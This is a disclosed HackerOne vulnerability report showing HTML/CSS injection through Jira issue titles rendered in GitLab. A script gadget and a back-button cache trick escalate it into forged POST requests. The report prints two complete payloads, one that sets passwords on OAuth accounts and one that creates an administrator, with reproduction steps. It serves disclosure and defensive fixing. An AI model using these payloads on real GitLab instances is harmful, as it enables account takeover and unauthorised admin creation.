# Content injection in Jira issue title enabling sending arbitrary POST request as victim

## Report Details
- **Report ID**: 1533976
- **URL**: https://hackerone.com/reports/1533976
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-04-07T14:23:04.212Z
- **Disclosed**: 2022-09-22T21:32:45.137Z

## Reporter
- **Username**: joaxcar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
## Summary

The issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.

This time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.

For the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.

## Background
There is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.

Giving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.

But as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.

If you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js

When a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js

To weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.

## The payload
I will present two payloads that will show the potential damage from this attack.

There exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.

First of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example "sign in with GitHub". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require "current password" before an initial password has been set. The payload looks like this
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
If we pull this apart, we have
```
<a 
  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes
  class=js-feature-highlight <--- the classname to be used as a gadget
  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'
  ^--- The payload where the POST request will get sent
  >
.</a> <--- close the anchor tag
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
  ^--- Unlimited styling to make the website a bulletproof click machine :)
```
This will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.

When the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!


This payload will add a new administrator to the instance if an administrator visits the malicious page
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
Pulled apart
```
<a href=http:j15.se
  class=js-feature-highlight
  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>
.</a>
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```


## Steps to reproduce

This requires three things:
1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)
2. a Jira server. I used a cloud Jira instance on atlassian.com
3. a third party account that is not registered on GitLab. ex a GitHub user

POC:
1. Create a user `attacker`
2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)
3. Create a new project in the group called `attack_proj`
4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit
5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project
6. Log in to Jira and create a task on the dashboard and name it `<img src=#>`
7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue
8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.

{F1683460}

9. Now go back to Jira and create a new task and name it
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
10. Go back to the issue list and refresh to make sure it is created
11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com
12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)
13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload
14. A page will show up looking empty, click anywhere on the page
15. The page will flicker, and now when you hover over the page it will show a big blue button stating "Got it!". Click it

{F1683461}

16. Refresh the page, you should now be logged out from GitLab.com
17. Log in with the OAuth email and the password `12345678`

Account takeover!

Important to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)

## Impact

HTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.

## What is the current *bug* behavior?

The name/title field in the Jira issue page is not sanitized

## What is the expected *correct* behavior?

The name should be shown sanitized

## Output of checks

This bug happens on GitLab.com

## Impact

Account takeover and admin user creation through arbitrary POST request in Jira issue

## Attachments
- img.jpg
- gotit.jpg
